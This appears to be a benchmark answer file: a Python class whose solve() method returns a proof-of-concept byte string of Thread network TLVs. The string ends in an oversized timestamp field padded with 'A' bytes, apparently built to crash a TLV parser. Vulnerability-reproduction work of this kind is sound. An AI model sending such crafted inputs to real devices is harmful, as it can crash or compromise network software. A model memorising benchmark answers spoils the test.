class Solution:
    def solve(self, src_path: str) -> bytes:
        channel = b'\x18\x03\x00\x00\x0b'
        panid = b'\x19\x02\x12\x34'
        extpan = b'\x1a\x08\x00\x00\x00\x00\x00\x00\x00\x00'
        netname = b'\x1b\x01O'
        pskc = b'\x1c\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        secpol = b'\x1d\x03\x00\x00\x00'
        timestamp = b'\x15\x0c' + b'A' * 12
        poc = channel + panid + extpan + netname + pskc + secpol + timestamp
        return poc